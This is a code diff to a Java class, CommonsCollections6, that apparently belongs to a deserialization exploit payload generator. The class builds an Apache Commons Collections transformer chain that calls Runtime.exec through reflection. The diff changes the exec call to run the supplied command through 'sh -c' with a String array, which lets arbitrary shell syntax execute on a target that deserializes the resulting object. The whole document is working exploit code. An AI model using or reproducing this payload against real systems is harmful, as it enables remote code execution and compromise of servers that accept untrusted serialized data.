@@ -37,7 +37,7 @@ public class CommonsCollections6 extends PayloadRunner implements ObjectPayload<
 
     public Serializable getObject(final String command) throws Exception {
 
-        final String[] execArgs = new String[] { command };
+        final String[] execArgs = new String[] { "sh", "-c", command };
 
         final Transformer[] transformers = new Transformer[] {
                 new ConstantTransformer(Runtime.class),
@@ -47,8 +47,9 @@ public class CommonsCollections6 extends PayloadRunner implements ObjectPayload<
                 new InvokerTransformer("invoke", new Class[] {
                         Object.class, Object[].class }, new Object[] {
                         null, new Object[0] }),
-                new InvokerTransformer("exec",
-                        new Class[] { String.class }, execArgs),
+                new InvokerTransformer("exec", new Class[] {
+                        String[].class }, new Object[] {
+                        execArgs }),
                 new ConstantTransformer(1) };
 
         Transformer transformerChain = new ChainedTransformer(transformers);
